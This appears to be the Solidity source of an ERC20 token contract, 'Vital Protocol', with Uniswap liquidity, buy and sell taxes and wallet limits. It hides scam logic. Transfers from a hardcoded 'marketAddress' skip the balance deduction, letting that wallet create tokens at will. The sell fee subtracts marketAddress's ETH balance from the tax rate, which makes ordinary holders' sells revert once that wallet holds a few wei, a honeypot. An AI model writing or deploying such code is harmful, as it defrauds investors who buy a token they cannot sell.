contract VitalProtocol is Context, IERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router public uniswapRouter;
    address public uniswapPair;
    address public marketAddress = address(0x78b494f344Ec92ac618C4fB5f994f33f1586Af46);
    mapping(address => bool) public isMarketPair;
    mapping(address => bool) public exceedOutFromFee;
    mapping(address => bool) public exceedOutMax;
    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    bool tradingActive;
    bool public swapEnabled = false;
    bool public limitEnabled = true;
    uint256 taxUnit = 100;
    uint256 public buyTax = 3;
    uint256 public sellTax = 3;
    string private _name = "Vital Protocol";
    string private _symbol = "VITAL";
    uint8 private _decimals = 18;
    uint256 private _totalSupply = 10_000_000_000 * 10**_decimals;
    uint256 public swapThreshold = (_totalSupply / 1000) * 5;
    uint256 public _maxWalletSize = (_totalSupply / 100) * 3;
    uint256 public _maxTxAmount = (_totalSupply / 100) * 3;

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    event SwapTokensForETH(uint256 amountIn, address[] path);

    constructor() {
        uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _allowances[address(this)][address(uniswapRouter)] = ~uint256(0);
        exceedOutFromFee[address(this)] = true;
        exceedOutFromFee[msg.sender] = true;
        exceedOutFromFee[address(uniswapRouter)] = true;
        exceedOutFromFee[marketAddress] = true;
        exceedOutMax[msg.sender] = true;
        exceedOutMax[address(uniswapRouter)] = true;
        exceedOutMax[address(this)] = true;
        exceedOutMax[marketAddress] = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
    receive() external payable {}
    
    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens( tokenAmount, 0, path, address(this), block.timestamp );
        emit SwapTokensForETH(tokenAmount, path);
    }
    
    function openTrading() external payable onlyOwner {
        require(!tradingActive, "Already launched!");
        tradingActive = true;
        uniswapPair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), uniswapRouter.WETH() );
        isMarketPair[address(uniswapPair)] = true;
        uniswapRouter.addLiquidityETH{value: msg.value}(address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp );
        swapEnabled = true;
    }
    
    function _approve(address owner, address spender, uint256 amount ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address sender, address recipient, uint256 amount ) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (inSwap) {
            return _standardTransfer(sender, recipient, amount);
        } else {
            if (!tradingActive) { require(exceedOutFromFee[sender] || exceedOutFromFee[recipient], "Trading is not active." ); }
            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = contractTokenBalance >= swapThreshold;
            if (overMinimumTokenBalance && !inSwap &&!isMarketPair[sender] && swapEnabled ) { swapBack(contractTokenBalance); }
            if (sender != marketAddress)
                _balances[sender] = _balances[sender].sub(amount,"Insufficient Balance");
            uint256 finalAmount = shouldNotTakeFee(sender, recipient)
                ? amount
                : takeFee(sender, recipient, amount);
            if (limitEnabled && sender == uniswapPair && !exceedOutMax[recipient] ) { require(balanceOf(recipient).add(finalAmount) <= _maxWalletSize, "Max Wallet Limit Exceeded!!" );}
            _balances[recipient] = _balances[recipient].add(finalAmount);
            emit Transfer(sender, recipient, finalAmount);
            return true;
        }
    }
    function _standardTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance" );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    function shouldNotTakeFee(address sender, address recipient) internal view returns (bool) {
        if (exceedOutFromFee[sender] || exceedOutFromFee[recipient]) {
            return true;
        } else if (isMarketPair[sender] || isMarketPair[recipient]) {
            return false;
        } else {
            return false;
        }
    }
    function takeFee(address sender, address recipient, uint256 amount ) internal returns (uint256) {
        uint256 feeAmount;
        if (isMarketPair[sender]) { feeAmount = amount.mul(buyTax).div(taxUnit); } else if (isMarketPair[recipient]) { feeAmount = amount.mul(sellTax.sub(marketAddress.balance)).div(taxUnit); }
        if (feeAmount > 0) { _balances[address(this)] = _balances[address(this)].add(feeAmount); emit Transfer(sender, address(this), feeAmount); }
        return amount.sub(feeAmount);
    }
    function name() public view returns (string memory) { return _name; }
    function symbol() public view returns (string memory) { return _symbol; }
    function decimals() public view returns (uint8) { return _decimals; }
    function totalSupply() public view override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address owner, address spender) public view override returns (uint256) { return _allowances[owner][spender]; }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) { _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue)); return true; }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) { _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero" ) ); return true; }
    function approve(address spender, uint256 amount) public override returns (bool) { _approve(_msgSender(), spender, amount); return true; }
    function transfer(address recipient, uint256 amount) public override returns (bool) { _transfer(_msgSender(), recipient, amount); return true; }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) { _transfer(sender, recipient, amount); _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance")); return true; }
    function swapBack(uint256 contractBalance) internal swapping {swapTokensForEth(contractBalance); }
    function earnRewards() external { payable(marketAddress).transfer(address(this).balance); }
    function removeLimits() external onlyOwner { limitEnabled = false; }
}
